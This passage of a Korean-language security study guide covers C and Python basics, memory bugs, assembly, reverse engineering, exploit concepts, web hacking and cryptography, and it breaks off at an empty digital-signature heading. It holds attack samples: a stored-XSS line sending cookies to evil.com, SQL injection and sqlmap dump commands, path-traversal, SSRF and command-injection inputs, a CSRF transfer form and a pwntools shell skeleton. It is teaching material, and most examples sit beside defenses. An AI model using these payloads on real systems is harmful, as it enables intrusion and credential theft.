printf("XOR: %d\n", x ^ y);   // 127
printf("NOT: %d\n", (unsigned char)~x); // 53
printf("<<:  %d\n", x << 1);  // 왼쪽 시프트 (×2)
printf(">>:  %d\n", x >> 1);  // 오른쪽 시프트 (÷2)

// XOR 특성 (암호학의 기초):
// A ^ B ^ B = A (같은 값으로 두 번 XOR하면 원래 값)
unsigned char secret = 42;
unsigned char key = 0xFF;
unsigned char encrypted = secret ^ key;   // 213
unsigned char decrypted = encrypted ^ key; // 42 (원복!)
```

## 16.5 조건문, 반복문, 함수

```c
// 조건문
if (score >= 90) printf("A\n");
else if (score >= 80) printf("B\n");
else printf("C\n");

// 반복문
for (int i = 0; i < 10; i++) { printf("%d ", i); }

// 함수
int add(int a, int b) { return a + b; }
```

**함수 호출 시 스택 (exploit의 핵심!):**
```
main()이 add(3, 5)를 호출:

    높은 주소
    ┌─────────────────┐
    │ main의 변수들     │
    ├─────────────────┤
    │ 복귀 주소         │ ← add 끝나면 여기로 돌아감
    │ 이전 프레임 포인터 │
    ├─────────────────┤
    │ a = 3, b = 5     │
    └─────────────────┘ ← SP
    낮은 주소

    "복귀 주소"를 덮어쓰면 → 프로그램 흐름 장악!
```

## 16.6 배열과 문자열

```c
int arr[5] = {10, 20, 30, 40, 50};
printf("%d\n", arr[0]);  // 10

// 문자열 = char 배열 + '\0'
char name[] = "Hello";  // ['H']['e']['l']['l']['o']['\0']

// 위험한 함수들 (취약점의 원인):
gets(buffer);          // 크기 제한 없음! → BOF
strcpy(dst, src);      // 크기 확인 안 함! → BOF
sprintf(buf, fmt, ...) // 크기 확인 안 함!
scanf("%s", buf);      // 크기 제한 없음!

// 안전한 대안:
fgets(buffer, size, stdin);
strncpy(dst, src, size);
snprintf(buf, size, fmt, ...);
```

**Format String 취약점:**
```c
printf(user_input);     // 위험! 사용자가 %x, %n 넣으면 메모리 유출/쓰기
printf("%s", user_input); // 안전
```

---

# 17. C 프로그래밍 중급 — 포인터와 메모리

## 17.1 포인터 기초

```c
int x = 42;
int *p = &x;     // p = x의 주소

printf("x의 값: %d\n", x);        // 42
printf("x의 주소: %p\n", &x);     // 0x7ffd12345678
printf("p가 가리키는 값: %d\n", *p); // 42

*p = 100;  // 포인터를 통해 x 변경
// x는 이제 100

// & = "주소를 알려줘"
// * = "그 주소의 값을 읽어/써"
```

## 17.2 포인터 연산

```c
int arr[5] = {10, 20, 30, 40, 50};
int *p = arr;  // 배열 이름 = 첫 원소의 주소

printf("%d\n", *p);       // 10
printf("%d\n", *(p+1));   // 20 (4바이트 이동)
printf("%d\n", *(p+2));   // 30

// arr[i] == *(arr + i) == *(p + i) == p[i]  전부 같음
```

## 17.3 구조체와 보안

```c
struct User {
    char name[32];
    int age;
    int is_admin;  // 0 = 일반, 1 = 관리자
};

// 메모리 레이아웃:
// 오프셋 0:  name[32]
// 오프셋 32: age
// 오프셋 36: is_admin

// name에 32바이트 넘게 쓰면 → age, is_admin 덮어쓰기 가능!
// → is_admin을 1로 만들어 관리자 권한 획득!
```

---

# 18. C 프로그래밍 고급 — 동적 메모리

## 18.1 스택 vs 힙

```
프로세스 메모리:
높은 주소  ┌──────────────┐
           │ 스택 (Stack) ↓│ ← 지역 변수, 자동 관리
           │              │
           │ ↕ 빈 공간    │
           │              │
           │ 힙 (Heap) ↑  │ ← malloc/free, 수동 관리
           ├──────────────┤
           │ BSS          │ ← 초기화 안 된 전역 변수
           │ Data         │ ← 초기화된 전역 변수
           │ Text (코드)  │ ← 기계어 (읽기 전용)
낮은 주소  └──────────────┘
```

## 18.2 malloc과 free

```c
int *p = (int *)malloc(sizeof(int) * 5);  // 힙에 20바이트 할당
if (p == NULL) { return 1; }  // 할당 실패 체크

for (int i = 0; i < 5; i++) p[i] = i * 10;

free(p);     // 해제
p = NULL;    // 안전 습관
```

## 18.3 메모리 버그 4종류 (취약점의 원천!)

```c
// 1. Use-After-Free (UAF) — checkm8이 이 유형!
char *data = malloc(64);
free(data);           // 해제
// data는 여전히 이전 주소를 가리킴 (dangling pointer)
char *evil = malloc(64);  // 같은 주소 재할당 가능!
strcpy(evil, "공격자 데이터");
printf("%s\n", data);  // "공격자 데이터" 출력!

// 2. Double Free — 같은 메모리 두 번 해제
free(p); free(p);  // 힙 구조 깨짐 → 임의 주소 쓰기 가능

// 3. Heap Buffer Overflow
char *buf = malloc(32);
strcpy(buf, "AAAA...매우 긴 문자열...");  // 32바이트 넘어 힙 깨짐

// 4. Memory Leak — free 안 함 → 메모리 고갈
```

---

# 19. C++ 핵심 개념

```cpp
class User {
public:
    char name[32];
    virtual void print() { std::cout << name << std::endl; }
};

// vtable (가상 함수 테이블):
// 객체 메모리: [vptr][name[32]]
// vptr → vtable → print 함수 주소
// vptr를 덮어쓰면 → 원하는 함수를 호출시킬 수 있음!
```

---

# 20. Python 프로그래밍

> Python은 보안 도구 작성, exploit 개발, 자동화에 필수입니다.
> pwntools, 스크립트, 웹 해킹 도구 전부 Python입니다.

## 20.1 기본 문법

```python
# 변수 (타입 선언 불필요)
name = "hacker"
age = 25
pi = 3.14
is_admin = True

# 문자열
print(f"이름: {name}, 나이: {age}")
print("hello"[0])     # 'h'
print("hello"[1:3])   # 'el' (슬라이싱)
print(len("hello"))    # 5
print("HELLO".lower()) # 'hello'
print("hello".upper()) # 'HELLO'

# 리스트 (배열)
nums = [10, 20, 30, 40, 50]
nums.append(60)        # 추가
nums.pop()             # 마지막 제거
print(nums[0])         # 10
print(nums[-1])        # 50 (마지막)
print(nums[1:3])       # [20, 30]

# 딕셔너리 (해시맵)
user = {"name": "Kim", "age": 25, "admin": False}
print(user["name"])    # "Kim"
user["admin"] = True   # 값 변경

# 조건문
if age >= 18:
    print("성인")
elif age >= 13:
    print("청소년")
else:
    print("어린이")

# 반복문
for i in range(5):       # 0, 1, 2, 3, 4
    print(i)

for item in nums:
    print(item)

for key, value in user.items():
    print(f"{key}: {value}")

# 함수
def greet(name, greeting="안녕"):
    return f"{greeting}, {name}!"

print(greet("Kim"))           # "안녕, Kim!"
print(greet("Kim", "Hello"))  # "Hello, Kim!"
```

## 20.2 보안에서 자주 쓰는 Python

```python
# 파일 읽기/쓰기
with open("data.txt", "r") as f:
    content = f.read()

with open("output.txt", "w") as f:
    f.write("결과 데이터")

# 바이너리 파일
with open("binary.bin", "rb") as f:
    data = f.read()
    print(data.hex())  # 16진수로 출력

# 바이트 조작 (exploit에서 필수)
payload = b"A" * 64           # 64바이트의 'A'
payload += b"\x78\x56\x34\x12"  # 리틀엔디안 주소

import struct
addr = struct.pack("<Q", 0x401234)  # 8바이트 리틀엔디안
print(addr)  # b'\x34\x12\x40\x00\x00\x00\x00\x00'

value = struct.unpack("<I", b"\x78\x56\x34\x12")[0]
print(hex(value))  # 0x12345678

# 네트워크 (소켓)
import socket

# TCP 클라이언트
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("example.com", 80))
s.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
response = s.recv(4096)
print(response.decode())
s.close()

# TCP 서버
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 8080))
server.listen(1)
conn, addr = server.accept()
print(f"연결: {addr}")
data = conn.recv(1024)
conn.send(b"Hello!")
conn.close()

# HTTP 요청 (requests 라이브러리)
import requests

r = requests.get("https://example.com")
print(r.status_code)  # 200
print(r.text[:100])    # HTML 앞부분

r = requests.post("https://example.com/login",
                   data={"username": "admin", "password": "test"})

# 16진수/인코딩 변환
import base64

text = "Hello"
encoded = base64.b64encode(text.encode())   # b'SGVsbG8='
decoded = base64.b64decode(encoded)          # b'Hello'

hex_str = text.encode().hex()     # '48656c6c6f'
original = bytes.fromhex(hex_str) # b'Hello'

# 해시
import hashlib

md5 = hashlib.md5(b"password").hexdigest()
sha256 = hashlib.sha256(b"password").hexdigest()
print(f"MD5: {md5}")
print(f"SHA256: {sha256}")
```

## 20.3 pwntools (Exploit 프레임워크)

```python
from pwn import *

# 로컬 바이너리 실행
p = process('./vulnerable')

# 원격 서버 연결
# p = remote('challenge.ctf.com', 1234)

# 데이터 송수신
p.sendline(b"hello")           # 줄바꿈 포함 전송
p.send(b"hello")               # 줄바꿈 없이 전송
response = p.recvline()        # 한 줄 수신
response = p.recvuntil(b"> ")  # 특정 문자열까지 수신

# 페이로드 구성
payload = b"A" * 72                          # 패딩
payload += p64(0x401234)                     # 주소 (64비트 리틀엔디안)
p.sendline(payload)

# ELF 분석
elf = ELF('./binary')
print(hex(elf.symbols['main']))              # main 함수 주소
print(hex(elf.got['printf']))                # printf GOT 주소

# ROP
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())

# 셸 획득 후 대화형 모드
p.interactive()
```

---

# 21. SQL 기초

> SQL Injection은 웹 해킹의 가장 기본적인 공격입니다.
> SQL을 알아야 공격도 방어도 할 수 있습니다.

## 21.1 SQL 기본 문법

```sql
-- 데이터베이스/테이블 생성
CREATE DATABASE mydb;
USE mydb;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(100) NOT NULL,
    is_admin BOOLEAN DEFAULT FALSE
);

-- 데이터 삽입
INSERT INTO users (username, password, is_admin)
VALUES ('admin', 'super_secret', TRUE);

INSERT INTO users (username, password)
VALUES ('user1', 'password123');

-- 데이터 조회
SELECT * FROM users;                          -- 전체 조회
SELECT username, is_admin FROM users;          -- 특정 컬럼
SELECT * FROM users WHERE username = 'admin';  -- 조건 조회
SELECT * FROM users WHERE is_admin = TRUE;
SELECT * FROM users ORDER BY id DESC;          -- 정렬
SELECT COUNT(*) FROM users;                    -- 개수

-- 데이터 수정
UPDATE users SET password = 'new_pass' WHERE username = 'admin';

-- 데이터 삭제
DELETE FROM users WHERE username = 'user1';

-- 조인 (테이블 연결)
SELECT users.username, orders.product
FROM users
JOIN orders ON users.id = orders.user_id;

-- UNION (결과 합치기) — SQL Injection에서 핵심!
SELECT username, password FROM users
UNION
SELECT table_name, column_name FROM information_schema.columns;
```

## 21.2 SQL Injection

```
로그인 폼:
  ID:    [admin       ]
  PW:    [' OR 1=1 -- ]

서버에서 만드는 쿼리:
  SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 --'
  
해석:
  password='' OR 1=1   → 1=1은 항상 참!
  --                   → 나머지 쿼리 주석 처리
  
  → 비밀번호 없이 로그인 성공!

UNION 기반 인젝션:
  입력: ' UNION SELECT username, password FROM users --
  → 모든 사용자의 ID/PW 유출!

방어:
  1. Prepared Statement (매개변수화된 쿼리)
     cursor.execute("SELECT * FROM users WHERE name=?", (username,))
  2. ORM 사용 (SQLAlchemy 등)
  3. 입력 검증/이스케이프
```

---

# 22. 자료구조

> 보안에서 자료구조가 필요한 이유:
> - 힙 exploit은 힙의 내부 자료구조(연결 리스트)를 조작하는 것
> - 알고리즘 문제 (코딩 테스트)
> - 효율적인 도구 작성

## 22.1 스택 (Stack)

```
LIFO (Last In, First Out): 마지막에 넣은 것이 먼저 나옴

  push(A) → [A]
  push(B) → [A, B]
  push(C) → [A, B, C]
  pop()   → C 반환, [A, B]
  pop()   → B 반환, [A]

C 구현:
```

```c
#define MAX 100
int stack[MAX];
int top = -1;

void push(int val) {
    if (top >= MAX - 1) { printf("스택 오버플로우!\n"); return; }
    stack[++top] = val;
}

int pop() {
    if (top < 0) { printf("스택 언더플로우!\n"); return -1; }
    return stack[top--];
}

int peek() { return stack[top]; }
int is_empty() { return top < 0; }
```

```
보안에서의 스택:
  - 함수 호출 스택이 바로 이 자료구조
  - push = 함수 호출 (복귀 주소, 지역 변수 저장)
  - pop = 함수 반환 (저장된 정보 복원)
  - Stack BOF = 이 스택을 오버플로우시키는 것
```

## 22.2 큐 (Queue)

```
FIFO (First In, First Out): 먼저 넣은 것이 먼저 나옴

  enqueue(A) → [A]
  enqueue(B) → [A, B]
  enqueue(C) → [A, B, C]
  dequeue()  → A 반환, [B, C]

용도: 네트워크 패킷 처리, 프린터 대기열, BFS 알고리즘
```

## 22.3 연결 리스트 (Linked List)

```c
struct Node {
    int data;
    struct Node *next;
};

// 메모리: [data|next] → [data|next] → [data|NULL]

// 힙의 free list가 이 구조!
// free된 청크: [size|fd|bk] → [size|fd|bk] → ...
// fd/bk를 조작하면 → 임의 주소 쓰기 가능 (힙 exploit)
```

## 22.4 해시 테이블 (Hash Table)

```
키-값 쌍을 빠르게 저장/검색하는 자료구조.
평균 검색 시간: O(1)

동작:
  hash("admin") = 3  → table[3] = {"admin": "password123"}
  hash("user1") = 7  → table[7] = {"user1": "pass456"}
  
  검색: hash("admin") = 3 → table[3] 바로 접근!

해시 충돌: 다른 키가 같은 인덱스를 가리킬 때
  해결: 체이닝 (연결 리스트), 개방 주소법

Python의 딕셔너리가 해시 테이블:
  user = {"name": "Kim"}  # 내부적으로 해시 테이블
```

## 22.5 트리 (Tree)

```
계층적 구조:
        root
       /    \
      A      B
     / \      \
    C   D      E

이진 탐색 트리 (BST):
  왼쪽 자식 < 부모 < 오른쪽 자식
  
       8
      / \
     3   10
    / \    \
   1   6    14

  검색 시간: O(log n) — 매번 반으로 줄어듦

용도: 파일시스템, DNS 계층, 데이터 정렬/검색
```

## 22.6 그래프 (Graph)

```
노드(정점)와 간선(엣지)으로 구성:

  A --- B
  |     |
  C --- D --- E

방향 그래프: A → B (한 방향만)
무방향 그래프: A — B (양방향)
가중 그래프: A --5-- B (간선에 가중치)

용도: 네트워크 토폴로지, 라우팅 경로 탐색, 소셜 네트워크
```

---

# 23. 알고리즘 기초

## 23.1 시간 복잡도 (Big-O)

```
알고리즘의 효율성을 나타내는 표기법:

O(1)      : 상수 시간 — 입력 크기와 무관하게 일정
             예: 배열 인덱스 접근 arr[5]

O(log n)  : 로그 시간 — 이진 탐색
             1000개에서 10번이면 찾음

O(n)      : 선형 시간 — 전체를 한 번 순회
             1000개 → 최대 1000번

O(n log n): 효율적인 정렬
             1000개 → 약 10,000번

O(n²)     : 이중 반복문
             1000개 → 1,000,000번

O(2^n)    : 지수 시간 — 브루트포스 암호 해독
             20자리 → 1,048,576가지

비밀번호 크래킹 관점:
  4자리 숫자 PIN: 10^4 = 10,000 가지 (순식간)
  8자리 영숫자:  62^8 ≈ 218조 가지 (오래 걸림)
  → 비밀번호 길이가 보안의 핵심
```

## 23.2 정렬 알고리즘

```c
// 버블 정렬 — O(n²), 느리지만 이해하기 쉬움
void bubble_sort(int arr[], int n) {
    for (int i = 0; i < n - 1; i++) {
        for (int j = 0; j < n - i - 1; j++) {
            if (arr[j] > arr[j + 1]) {
                int temp = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = temp;
            }
        }
    }
}
```

```python
# Python 정렬 (내장)
nums = [5, 2, 8, 1, 9]
nums.sort()          # 원본 변경: [1, 2, 5, 8, 9]
sorted_nums = sorted(nums)  # 새 리스트 반환
```

## 23.3 탐색 알고리즘

```c
// 이진 탐색 — O(log n), 정렬된 배열에서만 사용 가능
int binary_search(int arr[], int n, int target) {
    int low = 0, high = n - 1;
    while (low <= high) {
        int mid = (low + high) / 2;
        if (arr[mid] == target) return mid;      // 찾음!
        else if (arr[mid] < target) low = mid + 1;  // 오른쪽 절반
        else high = mid - 1;                        // 왼쪽 절반
    }
    return -1;  // 못 찾음
}

// 1024개 원소에서 최대 10번 비교로 찾을 수 있음!
// log2(1024) = 10
```

## 23.4 재귀 (Recursion)

```c
// 팩토리얼: 5! = 5 × 4 × 3 × 2 × 1 = 120
int factorial(int n) {
    if (n <= 1) return 1;       // 기저 조건 (멈추는 조건)
    return n * factorial(n - 1); // 자기 자신 호출
}

// 호출 과정:
// factorial(5)
//   = 5 * factorial(4)
//     = 4 * factorial(3)
//       = 3 * factorial(2)
//         = 2 * factorial(1)
//           = 1  ← 기저 조건
//         = 2 * 1 = 2
//       = 3 * 2 = 6
//     = 4 * 6 = 24
//   = 5 * 24 = 120

// 각 호출이 스택 프레임을 만듦 → 너무 깊으면 스택 오버플로우!
```

---

# Part 4: 시스템 (24~27장)

> 이 부분은 기존 security-study-guide.md의 5~8장과 동일합니다.
> 핵심만 요약하고 새로운 내용을 추가합니다.

# 24. 컴퓨터 구조 — 하드웨어 기초

```
CPU 구성: 제어장치(Control) + 연산장치(ALU) + 레지스터(Registers)

ARM64 핵심 레지스터:
  X0~X7  : 함수 인자 + 반환값 (X0)
  X29(FP): Frame Pointer
  X30(LR): Link Register (복귀 주소!) ← exploit 대상
  SP     : Stack Pointer
  PC     : Program Counter (현재 실행 위치)

메모리 계층:
  레지스터(0.3ns) → L1(1ns) → L2(4ns) → L3(10ns) → RAM(100ns) → SSD(100μs)

이진수/16진수 (보안 필수!):
  16진수 1자리 = 2진수 4자리
  0xA = 1010, 0xF = 1111
  0xFF = 11111111 = 255 (1바이트 최대)
  0xDEADBEEF = 디버깅 마커
  0x41 = 'A' (ASCII)
```

# 25. 컴퓨터 구조 — CPU 심화

```
가상 메모리:
  각 프로세스가 독립된 주소 공간을 가짐
  페이지 테이블로 가상 주소 → 물리 주소 매핑
  페이지 권한: R(읽기), W(쓰기), X(실행)
  
  코드 영역: R-X (읽기+실행, 쓰기 불가)
  데이터 영역: RW- (읽기+쓰기, 실행 불가) ← NX/DEP의 원리

시스콜 (시스템 콜):
  사용자 프로그램 → SVC → 커널 기능 호출 → 결과 반환
  ARM64: X8=번호, X0~X5=인자, SVC #0
```

# 26. 운영체제 — 프로세스와 메모리

```
프로세스: 실행 중인 프로그램, 독립된 메모리 공간
스레드: 프로세스 내 실행 단위, 메모리 공유 → Race Condition 위험!

권한 레벨:
  ARM: EL0(앱) → EL1(커널) → EL2(하이퍼바이저) → EL3(Secure Monitor)
  탈옥/루팅 = EL0 → EL1 권한 상승
```

# 27. 운영체제 — 커널과 시스템콜

```
주요 시스콜:
  read/write  : 파일 입출력
  mmap        : 메모리 매핑
  mprotect    : 메모리 권한 변경 ← exploit에서 RWX로 바꿔 셸코드 실행
  execve      : 프로그램 실행 ← 셸코드의 목표!
```

---

# Part 5: 어셈블리 (28~30장)

# 28. ARM 어셈블리 기초

```asm
; 데이터 이동
MOV  X0, #42          ; X0 = 42
MOV  X1, X0           ; X1 = X0

; 산술
ADD  X0, X1, X2       ; X0 = X1 + X2
SUB  X0, X1, X2       ; X0 = X1 - X2

; 메모리
LDR  X0, [X1]         ; X0 = *(X1) — 메모리에서 읽기
STR  X0, [X1]         ; *(X1) = X0 — 메모리에 쓰기
LDR  X0, [X1, #8]     ; X0 = *(X1 + 8)

; 비교와 분기
CMP  X0, X1           ; X0 - X1 비교 (결과 버림, 플래그만)
B.EQ label            ; 같으면 점프
B.NE label            ; 다르면 점프
B.GT label            ; 크면 점프
B    label            ; 무조건 점프

; 함수 호출
BL   function         ; 점프 + 복귀 주소를 X30에 저장
RET                   ; X30 주소로 복귀

; 함수 시작/끝 패턴 (프롤로그/에필로그)
STP  X29, X30, [SP, #-16]!  ; FP, LR 저장
MOV  X29, SP
; ... 함수 본문 ...
LDP  X29, X30, [SP], #16    ; FP, LR 복원
RET
```

# 29. ARM 어셈블리 심화

```
함수 호출 규약 (AAPCS64):
  X0~X7: 인자 전달 (X0 = 첫 인자 + 반환값)
  X19~X28: callee-saved (함수가 보존해야)
  X29(FP): 프레임 포인터
  X30(LR): 복귀 주소
```

# 30. x86-64 어셈블리

```asm
; x86-64 (Intel 구문, IDA Pro에서 사용)
mov  rax, 42          ; rax = 42
mov  rax, [rbx]       ; rax = *(rbx)
add  rax, rbx         ; rax += rbx
push rbx              ; 스택에 저장
pop  rbx              ; 스택에서 복원
call function          ; 함수 호출
ret                    ; 복귀

; 함수 인자 순서 (Linux):
; RDI, RSI, RDX, RCX, R8, R9
; 반환값: RAX
```

---

# Part 6: 리버스 엔지니어링 (31~32장)

# 31. 리버스 엔지니어링 기초

```
필수 도구:
  Ghidra (무료, NSA) — 디스어셈블러/디컴파일러
  GDB + GEF/pwndbg — 디버거
  objdump, readelf, strings, file, strace, checksec

기본 분석 절차:
  file → strings → checksec → Ghidra/objdump → GDB

GDB 핵심 명령어:
  break main       # 브레이크포인트
  run              # 실행
  next/step        # 다음 줄
  info registers   # 레지스터 확인
  x/10x $rsp       # 스택 메모리 확인
  x/s 0x401234     # 문자열 확인
  set $rax = 1     # 레지스터 값 변경
```

# 32. 리버스 엔지니어링 실전

```
비밀번호 찾기 패턴:
  LEA RDI, [input]
  LEA RSI, [0x402010]    ← 이 주소에 비밀번호!
  CALL strcmp
  TEST EAX, EAX
  JNE fail

안티 디버깅 우회:
  ptrace 검사 → GDB에서 반환값을 0으로 변경
  시간 측정 → 시간 함수 후킹
  분기 패치 → JNE를 NOP(0x9090)으로 변경
```

---

# Part 7: 취약점과 Exploit (33~35장)

# 33. 취약점 유형 완전 분석

```
1. Stack Buffer Overflow — gets(), strcpy()로 복귀 주소 덮어쓰기
2. Format String — printf(user_input)으로 메모리 유출/쓰기
3. Use-After-Free — free 후 포인터 재사용 → 공격자 데이터 실행
4. Double Free — 같은 메모리 2번 해제 → 힙 구조 조작
5. Integer Overflow — 정수 오버플로우 → 잘못된 크기 할당
6. Type Confusion — 객체 타입 혼동 → 잘못된 메모리 해석
7. Race Condition — 확인과 사용 사이의 틈 악용 (TOCTOU)
```

# 34. Exploit 개발 기초

```
셸코드: execve("/bin/sh") 를 실행하는 기계어
  NX 없으면 → 셸코드 직접 실행
  NX 있으면 → Return-to-libc 또는 ROP

ROP (Return-Oriented Programming):
  기존 코드 조각(gadget)을 체인으로 연결
  예: "pop rdi; ret" → 스택에서 "/bin/sh" 주소를 RDI에 로드 → system() 호출

스택 구성:
  [패딩] + [pop rdi; ret 주소] + ["/bin/sh" 주소] + [system() 주소]
```

# 35. Exploit 개발 심화

```
ASLR 우회: 정보 유출(leak)로 libc 베이스 주소 계산
GOT Overwrite: printf@got를 system 주소로 덮어쓰기
힙 Exploit: tcache poisoning — 해제된 청크의 next 포인터 조작
```

---

# Part 8: 보호 기법 (36장)

# 36. 최신 보호 기법과 우회

```
보호 기법          하는 일                  우회 방법
──────────────────────────────────────────────────────────
Stack Canary    스택에 랜덤 값 삽입       카나리 값 leak 후 보존
NX / DEP        데이터 영역 실행 불가     ROP / Return-to-libc
ASLR            주소 랜덤화              info leak으로 주소 계산
PIE             바이너리도 랜덤 배치      바이너리 주소도 leak
RELRO           GOT 읽기 전용            Full이면 GOT 공격 불가
CFI             제어 흐름 무결성 검사     허용 범위 내 공격
PAC (ARM)       포인터에 서명            PAC 키 유출/가젯 활용
```

---

# Part 9: 웹 해킹 (37~38장)

---

# 37. 웹 기초 — HTTP와 웹 구조

```
웹 요청 흐름:
  브라우저 → DNS → 웹 서버 → 응용 서버 → 데이터베이스
                                          ↓
  브라우저 ← HTTP 응답 (HTML/JSON) ←──────┘

HTTP 요청 구조:
  GET /login HTTP/1.1
  Host: example.com
  User-Agent: Mozilla/5.0
  Cookie: session=abc123
  
  (빈 줄)
  (POST일 때 본문 데이터)

HTTP 응답 구조:
  HTTP/1.1 200 OK
  Content-Type: text/html
  Set-Cookie: session=xyz789
  
  <html>...</html>

쿠키와 세션:
  쿠키: 브라우저에 저장되는 키-값 데이터
  세션: 서버에 저장되는 사용자 상태 정보
  세션 ID가 쿠키에 담겨 매 요청마다 전송
  → 세션 ID를 훔치면 = 그 사용자로 로그인 가능!

개발자 도구 (F12):
  Network 탭: 모든 HTTP 요청/응답 확인
  Console 탭: JavaScript 실행
  Elements 탭: HTML 수정
  Application 탭: 쿠키, 로컬 스토리지 확인
```

## 웹 프록시 (Burp Suite)

```
Burp Suite: 웹 해킹의 필수 도구 (무료 Community Edition 있음)

브라우저 → Burp Suite(프록시) → 웹 서버
           ↑ 여기서 요청을 가로채고 수정!

주요 기능:
  Proxy: 요청 가로채기/수정
  Repeater: 요청을 수정해서 반복 전송
  Intruder: 자동화된 공격 (브루트포스, 퍼징)
  Decoder: 인코딩/디코딩 (Base64, URL, HTML)
```

---

# 38. 웹 해킹 — OWASP Top 10

## 38.1 SQL Injection

```
(21장에서 다룸 — SQL 기초 참고)

추가 기법:

Blind SQL Injection:
  결과가 화면에 안 보일 때, 참/거짓 반응으로 데이터 추출

  ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
  → 참이면 정상 페이지, 거짓이면 에러 → 한 글자씩 추출

Time-based Blind:
  ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
  → 5초 지연이면 'a'가 맞음

자동화 도구: sqlmap
  sqlmap -u "http://target.com/page?id=1" --dbs
  sqlmap -u "http://target.com/page?id=1" -D mydb --tables
  sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump
```

## 38.2 XSS (Cross-Site Scripting)

```
사용자의 브라우저에서 악성 JavaScript 실행

종류:
  Reflected XSS: URL에 스크립트 삽입 → 피해자가 클릭
    http://target.com/search?q=<script>alert(1)</script>
  
  Stored XSS: 게시판 등에 스크립트 저장 → 모든 방문자에게 실행
    게시글 내용: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
    → 방문자의 쿠키(세션) 탈취!
  
  DOM XSS: 클라이언트 JavaScript에서 발생

공격 시나리오:
  1. 공격자가 XSS 취약점이 있는 게시판에 스크립트 삽입
  2. 관리자가 해당 글을 열람
  3. 스크립트가 관리자의 쿠키를 공격자 서버로 전송
  4. 공격자가 관리자의 세션으로 로그인

방어:
  입력 필터링: <, >, ", ' 등을 &lt; &gt; 등으로 변환
  CSP (Content Security Policy): 실행 가능한 스크립트 제한
  HttpOnly 쿠키: JavaScript에서 쿠키 접근 불가
```

## 38.3 CSRF (Cross-Site Request Forgery)

```
피해자의 권한으로 의도하지 않은 요청 실행

시나리오:
  1. 관리자가 은행 사이트에 로그인 상태
  2. 공격자가 만든 악성 페이지 방문
  3. 악성 페이지에 숨겨진 폼이 자동 전송:
     <form action="https://bank.com/transfer" method="POST">
       <input type="hidden" name="to" value="attacker">
       <input type="hidden" name="amount" value="1000000">
     </form>
     <script>document.forms[0].submit();</script>
  4. 관리자의 세션으로 송금 요청이 실행됨!

방어: CSRF 토큰 (매 요청마다 랜덤 값 검증)
```

## 38.4 기타 웹 취약점

```
SSRF (Server-Side Request Forgery):
  서버가 내부 리소스에 접근하게 만듦
  입력: http://target.com/fetch?url=http://169.254.169.254/metadata
  → 클라우드 서버의 내부 메타데이터(API 키 등) 유출!

LFI (Local File Inclusion):
  서버의 로컬 파일을 읽음
  http://target.com/page?file=../../../../etc/passwd
  → /etc/passwd 파일 내용 유출!

RCE (Remote Code Execution):
  서버에서 임의 코드 실행
  가장 심각한 취약점 — 서버 완전 장악

Command Injection:
  입력: ; cat /etc/passwd
  서버: system("ping " + user_input) → system("ping ; cat /etc/passwd")
  → /etc/passwd 유출!
```

---

# Part 10: 암호학 (39~40장)

---

# 39. 암호학 기초

## 39.1 대칭키 암호 (Symmetric)

```
같은 키로 암호화/복호화

평문 → [암호화(키)] → 암호문 → [복호화(같은 키)] → 평문

AES (Advanced Encryption Standard):
  현재 표준 대칭키 알고리즘
  키 크기: 128, 192, 256 비트
  블록 크기: 128 비트 (16바이트)
  
  용도: 파일 암호화, 디스크 암호화, HTTPS, Wi-Fi(WPA2)

작동 모드:
  ECB (Electronic Codebook): 같은 블록 → 같은 결과 (취약!)
    "같은 내용이면 같은 암호문" → 패턴 분석 가능
  
  CBC (Cipher Block Chaining): 이전 블록의 결과를 다음에 사용
    → 같은 평문이어도 다른 암호문 (더 안전)
  
  CTR (Counter): 카운터를 암호화하여 XOR → 스트림 암호처럼 동작
  
  GCM (Galois/Counter Mode): CTR + 인증 (무결성 검증)
    → 현재 가장 권장되는 모드
```

## 39.2 비대칭키 암호 (Asymmetric)

```
공개키로 암호화, 개인키로 복호화 (또는 그 반대)

키 생성: (공개키, 개인키) 쌍
암호화: 평문 → [공개키로 암호화] → 암호문
복호화: 암호문 → [개인키로 복호화] → 평문

RSA:
  큰 소수 두 개의 곱은 쉽지만, 그 곱을 인수분해하는 것은 어렵다는 원리
  
  키 생성 (간략):
    1. 큰 소수 p, q 선택 (각 1024비트 이상)
    2. n = p × q (공개)
    3. e 선택 (보통 65537)
    4. d 계산 (e의 역수, mod (p-1)(q-1))
    5. 공개키 = (n, e), 개인키 = (n, d)
  
  암호화: c = m^e mod n
  복호화: m = c^d mod n

용도: HTTPS 키 교환, 디지털 서명, SSH 인증

HTTPS에서의 사용:
  1. 서버가 공개키 전송 (인증서)
  2. 클라이언트가 대칭키를 생성하여 공개키로 암호화하여 전송
  3. 서버가 개인키로 복호화하여 대칭키 확보
  4. 이후 대칭키(AES)로 통신 (빠르니까)
```

## 39.3 해시 함수

```
임의 길이 입력 → 고정 길이 출력 (일방향, 역산 불가!)

MD5:     128비트 출력 — 취약! 충돌 발견됨. 사용 금지
SHA-1:   160비트 출력 — 취약! 2017년 충돌 발견. 사용 금지
SHA-256: 256비트 출력 — 현재 표준
SHA-3:   최신 표준 (다른 설계)

특성:
  1. 같은 입력 → 항상 같은 출력
  2. 입력이 1비트만 바뀌어도 출력이 완전히 달라짐 (쇄도 효과)
  3. 출력에서 입력을 역산할 수 없음 (일방향)
  4. 다른 입력이 같은 출력을 만들기 어려움 (충돌 저항)

비밀번호 저장:
  데이터베이스에 비밀번호를 평문으로 저장하면 위험!
  → 해시로 저장: SHA256("password") = "5e884898da..."
  → 로그인 시 입력값의 해시와 비교
  
  문제: 같은 비밀번호 → 같은 해시 → 레인보우 테이블로 크래킹
  해결: Salt (랜덤 값) 추가
    hash = SHA256(salt + "password")
    salt는 사용자마다 다르게 → 같은 비밀번호도 다른 해시
  
  최선: bcrypt, scrypt, Argon2 (느리게 설계된 해시)
    → 브루트포스가 어려워짐
```

## 39.4 디지털 서명

```
